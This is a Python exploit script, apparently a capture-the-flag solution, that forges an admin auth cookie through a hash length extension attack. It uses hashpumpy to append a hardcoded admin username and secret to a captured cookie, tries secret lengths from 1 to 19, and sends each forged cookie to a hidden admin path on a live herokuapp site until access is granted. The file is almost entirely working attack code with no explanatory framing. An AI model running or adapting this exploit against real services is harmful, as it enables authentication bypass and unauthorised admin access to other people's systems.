import sys
from base64 import b64encode, b64decode
from hashpumpy import hashpump
import requests

# Takes the auth cookie hash as the only argument
# Makes it an admin cookie via a Length Extension attack

# auth_uri = 'http://localhost:8000/m4st3rfully_h1dd3n/admin'
auth_uri = 'https://don-joes-blog.herokuapp.com/m4st3rfully_h1dd3n/admin'

def test_cookie(cookie):
    # print("Sending cookie: " + cookie)
    proxies = {}
    # proxies = {"http": "http://127.0.0.1:8080"}
    res = requests.get(auth_uri, cookies={'auth': cookie}, proxies=proxies)
    # print(res)
    print(f"\t Status Code: {res.status_code}")
    return res.status_code != 403


# Cookie that the server gave us
cookie = sys.argv[1]
# cookie = 'dXNlcm5hbWU9c3VwcmVtZV91c2VyO3NlY3JldD1hZjM1MWY0NDMxMzBmMzY5YzBjZGU5ODIxMTBhMDdiYjhmODgxMTJjY2ZiMGI5MjM2ZWFjMWUyYTIzY2IwNTQxOw==.3xHgd/1Xzi/go5AZl7lpuo294SULTyMrUBsvVifl5uo='

cookie_data, cookie_signature = list(map(b64decode, cookie.split('.')))

target_username = 'admin'
target_secret = '2ae3a0f2ef89bf388e7cdc7f5fc9f1b60e5542d0a6c2f6f1cf88190d0ab2b711'

extra_cookie_values = f"username={target_username};secret={target_secret};"

print()
print('og signature -->', cookie_signature.hex())
print('og data -->', cookie_data.decode())
print('extra data to append -->', extra_cookie_values)
print()

for secret_length in range(1, 20):
    print(f"-> Testing for secret_length={secret_length}")

    new_signature, new_message = hashpump(
        cookie_signature.hex(),
        cookie_data.decode(),
        ";" + extra_cookie_values,
        secret_length
    )

    # new_message is bytes, new_signature is (hex) string
    new_cookie = b64encode(new_message) + b'.' + b64encode(bytes.fromhex(new_signature))
    # request needs a string and not bytes
    new_cookie = new_cookie.decode()

    if test_cookie(new_cookie):
        print("Success in fooling the server via Length Extension Attack!")
        print(new_cookie)
        break


